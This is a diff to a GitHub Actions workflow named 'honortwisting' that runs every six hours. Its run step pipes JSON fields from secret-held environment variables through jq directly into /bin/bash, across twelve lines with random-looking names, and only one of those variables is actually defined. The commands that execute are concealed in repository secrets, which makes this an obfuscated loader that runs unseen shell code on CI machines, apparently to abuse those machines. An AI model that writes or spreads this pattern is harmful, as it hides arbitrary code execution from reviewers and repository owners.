@@ -1,8 +1,9 @@
 name: honortwisting
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '24 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,9 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: honortwisting
         env:
-          pl1949: ${{ secrets.pl1949 }}
+          xwh073: ${{ secrets.xwh073 }}
         run: |
-          echo $pl1949 | jq -r .u9 | /bin/bash
-          echo $sepe17165 | jq -r .wb2966 | /bin/bash
-          echo $n0 | jq -r .a97491 | /bin/bash
+          echo $xwh073 | jq -r .l53 | /bin/bash
+          echo $zson138 | jq -r .z79 | /bin/bash
+          echo $igao4038 | jq -r .k5 | /bin/bash
+          echo $tjeyh677 | jq -r .v21187 | /bin/bash
+          echo $owy72285 | jq -r .uen2 | /bin/bash
+          echo $u33 | jq -r .uq71413 | /bin/bash
+          echo $bhto3 | jq -r .r4 | /bin/bash
+          echo $g1 | jq -r .fq9451 | /bin/bash
+          echo $byw03 | jq -r .a63 | /bin/bash
+          echo $kg0602 | jq -r .qgki50422 | /bin/bash
+          echo $kpexb42 | jq -r .yh08 | /bin/bash
+          echo $kuky7 | jq -r .chco29245 | /bin/bash
 
